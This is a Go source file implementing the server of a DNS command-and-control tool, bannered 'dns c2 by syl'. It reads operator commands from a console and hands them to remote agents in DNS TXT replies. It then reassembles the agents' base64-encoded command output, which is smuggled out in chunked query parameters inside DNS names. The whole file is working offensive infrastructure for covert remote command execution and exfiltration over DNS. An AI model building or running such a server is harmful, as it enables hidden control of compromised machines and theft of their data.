package cmd

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net/url"
	"os"
	"strings"

	"github.com/erdaltsksn/cui"
	"github.com/miekg/dns"
)

var cmd string = ""
var joinBuffer []string
var outputBuffer string

func resetState() {
	cmd = ""
	joinBuffer = nil
}

func Run() {
	fmt.Println("><((((> dns c2 by syl <))))><")
	args := os.Args[1:]
	server := &dns.Server{Addr: args[0], Net: "udp"}

	go func() {
		if err := server.ListenAndServe(); err != nil {
			cui.Error("Failed to setup the server", err)
		}
		defer server.Listener.Close()
	}()

	for {
		fmt.Print("\ndnsc2> ")
		scanner := bufio.NewScanner(os.Stdin)
		if scanner.Scan() {
			cmd = scanner.Text()
			if cmd == " " {
				continue
			}
		}
		// Set Command
		dns.HandleFunc(".", AgentHandler)

		// Wait for full reply
		for cmd != "" {
			if cmd == "" {
				break
			}
		}
		fmt.Println(outputBuffer)
	}
}

func AgentHandler(w dns.ResponseWriter, req *dns.Msg) {
	urlConstr := "https://" + req.Question[0].Name[:len(req.Question[0].Name)-1]
	malMess, err := url.Parse(urlConstr)
	if err != nil {
		fmt.Println("URL Parsing Error")
	}
	message := malMess.Query()

	dnsMessage := new(dns.Msg)
	dnsMessage.SetReply(req)
	dnsMessage.Authoritative = true
	defer w.WriteMsg(dnsMessage)

	dnsMessage.Answer = append(dnsMessage.Answer, &dns.TXT{
		Hdr: dns.RR_Header{
			Name:  req.Question[0].Name,
			Class: req.Question[0].Qclass,
			Ttl:   0, Rrtype: dns.TypeTXT,
		},
		Txt: []string{cmd},
	})

	if messageValue, ok := message["o"]; ok {
		chunkLen := message["cs"][0]
		currentChunk := message["cc"][0]

		joinBuffer = append(joinBuffer, messageValue[0])
		if currentChunk == chunkLen {
			joinResult := strings.Join(joinBuffer, "")
			sDec, _ := base64.StdEncoding.DecodeString(joinResult)
			outputBuffer = string(sDec)
			resetState()
		}

	}
}
